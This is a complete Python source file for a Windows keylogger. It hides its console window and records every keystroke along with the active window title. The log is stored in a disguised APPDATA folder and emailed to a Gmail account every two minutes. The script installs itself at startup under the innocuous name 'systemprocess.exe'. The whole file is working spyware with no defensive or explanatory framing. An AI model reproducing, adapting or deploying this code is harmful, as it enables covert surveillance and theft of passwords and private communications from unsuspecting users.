import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
import os
import sys
import time
import smtplib
import shutil
import schedule
from pynput import keyboard
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import win32gui
import win32com.client

# 🔐 Email credentials
SENDER_EMAIL = "your_email@gmail.com"
SENDER_PASSWORD = "your_gmail_app_password"
RECEIVER_EMAIL = "your_email@gmail.com"


# 📁 Hidden log directory
LOG_DIR = os.path.join(os.getenv('APPDATA'), "SystemLogs")
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

LOG_FILE = os.path.join(LOG_DIR, "keystrokes.txt")
current_window = ""
typed_chars = []

# 🧠 Get active window name
def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

# ⌨️ Log keypresses with full words
def on_press(key):
    global current_window, typed_chars
    new_window = get_active_window()

    if new_window != current_window:
        current_window = new_window
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n\n[Window: {current_window} - {datetime.now()}]\n")

    try:
        if hasattr(key, 'char') and key.char is not None:
            typed_chars.append(key.char)
        elif key == keyboard.Key.space:
            typed_chars.append(' ')
        elif key == keyboard.Key.enter:
            typed_chars.append('\n')
        elif key == keyboard.Key.backspace:
            if typed_chars:
                typed_chars.pop()

        if key in [keyboard.Key.space, keyboard.Key.enter]:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now()} - {''.join(typed_chars).strip()}\n")
            typed_chars.clear()

    except Exception as e:
        pass

# 📧 Email the keystroke log
def send_email():
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        return

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_content = f.read()

    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = f"Keystroke Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    msg.attach(MIMEText(log_content, "plain"))

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        pass

    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("")

# 🪟 Add to startup
def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    script_path = os.path.realpath(sys.argv[0])

    target_dir = os.path.join(os.getenv('APPDATA'), "SystemLogs")
    hidden_exe = os.path.join(target_dir, "systemprocess.exe")

    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    if not os.path.exists(hidden_exe):
        try:
            shutil.copyfile(script_path, hidden_exe)
        except:
            pass

    shortcut_path = os.path.join(startup_path, "systemprocess.lnk")
    if not os.path.exists(shortcut_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = hidden_exe
        shortcut.WorkingDirectory = target_dir
        shortcut.WindowStyle = 7
        shortcut.save()

# 🔁 Schedule email every 2 minutes
schedule.every(2).minutes.do(send_email)

# 🎯 Start logging
def run_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:
        schedule.run_pending()
        time.sleep(10)

if __name__ == "__main__":
    add_to_startup()
    run_keylogger() 